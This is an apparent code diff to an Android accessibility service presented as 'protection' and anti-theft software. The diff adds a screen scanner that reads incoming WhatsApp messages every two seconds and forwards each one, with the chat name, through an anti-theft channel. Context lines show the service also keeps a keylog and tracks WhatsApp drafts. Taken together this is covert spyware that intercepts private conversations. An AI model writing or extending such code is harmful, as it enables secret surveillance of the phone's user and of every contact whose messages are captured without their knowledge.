@@ -17,6 +17,10 @@ class ProtectAccessibilityService : AccessibilityService() {
     private val whatsAppDrafts = mutableMapOf<String, String>()
     private var currentWhatsAppChat: String = ""
 
+    // Tracks messages already captured from the screen to avoid duplicates
+    private val capturedScreenMessages = mutableSetOf<String>()
+    private var lastScreenScanMs = 0L
+
     // Keylog: track last sent text per app to avoid spamming identical strings
     private val lastKeylogText = mutableMapOf<String, String>()
 
@@ -34,10 +38,18 @@ class ProtectAccessibilityService : AccessibilityService() {
             when (event.eventType) {
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                    val chatName = findWhatsAppChatName(rootInActiveWindow)
+                    val root = rootInActiveWindow
+                    val chatName = findWhatsAppChatName(root)
                     if (chatName.isNotBlank()) {
                         currentWhatsAppChat = chatName
                         Log.d("AccessibilityService", "WhatsApp chat: $currentWhatsAppChat")
+                    }
+                    // Scan visible conversation messages (captures messages when WhatsApp
+                    // is open and focused — no notification needed)
+                    val now = System.currentTimeMillis()
+                    if (currentWhatsAppChat.isNotBlank() && now - lastScreenScanMs > 2_000) {
+                        lastScreenScanMs = now
+                        scanVisibleMessages(root, currentWhatsAppChat)
                     }
                 }
                 AccessibilityEvent.TYPE_VIEW_CLICKED -> {
@@ -144,6 +156,62 @@ class ProtectAccessibilityService : AccessibilityService() {
         }
         for (i in 0 until node.childCount) {
             collectWhatsAppTitleCandidates(node.getChild(i), out)
+        }
+    }
+
+    /**
+     * Scans the visible WhatsApp conversation for text message bubbles and forwards
+     * any new ones found. Runs at most every 2s per content-change event.
+     * Only captures incoming messages (direction="in") — outgoing are captured via
+     * the send-button click handler to preserve the correct direction label.
+     */
+    private fun scanVisibleMessages(root: AccessibilityNodeInfo?, chatName: String) {
+        if (root == null || chatName.isBlank()) return
+        try {
+            // WhatsApp message bubble text nodes
+            val bubbleIds = listOf(
+                "com.whatsapp:id/message_text",
+                "com.whatsapp.w4b:id/message_text"
+            )
+            val now = System.currentTimeMillis()
+
+            for (viewId in bubbleIds) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
+                for (node in nodes) {
+                    val text = node.text?.toString()?.trim() ?: continue
+                    if (text.isBlank() || text.length > 4000) continue
+                    // Simple dedup key: chatName + text (trim to 120 chars)
+                    val key = "$chatName|${text.take(120)}"
+                    if (capturedScreenMessages.contains(key)) continue
+                    capturedScreenMessages.add(key)
+                    if (capturedScreenMessages.size > 500) capturedScreenMessages.clear()
+
+                    // Check if this is a sent or received bubble by inspecting parent layout
+                    // WhatsApp places sent bubbles in "out_row" containers — skip those
+                    // (they are handled by the send-button click handler)
+                    val parentDesc = node.parent?.contentDescription?.toString()?.lowercase() ?: ""
+                    val parentId   = node.parent?.viewIdResourceName?.lowercase() ?: ""
+                    val isSent = parentId.contains("out") || parentDesc.contains("sent") ||
+                                 parentDesc.contains("enviada")
+                    if (isSent) continue
+
+                    Log.d("AccessibilityService", "Screen-scan captured msg in '$chatName': '${text.take(40)}'")
+                    sendScreenCapturedMessage(chatName, text, now)
+                }
+            }
+        } catch (e: Exception) {
+            Log.w("AccessibilityService", "scanVisibleMessages error: ${e.message}")
+        }
+    }
+
+    private fun sendScreenCapturedMessage(chatName: String, content: String, timestamp: Long) {
+        try {
+            val addressJson = Json.encodeToString(String.serializer(), chatName)
+            val contentJson = Json.encodeToString(String.serializer(), content)
+            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$addressJson,"name":$addressJson,"content":$contentJson,"source":"whatsapp","timestamp":$timestamp}"""
+            AntiTheftService.sendRawMessage(payload)
+        } catch (e: Exception) {
+            Log.e("AccessibilityService", "sendScreenCapturedMessage error: ${e.message}")
         }
     }
 
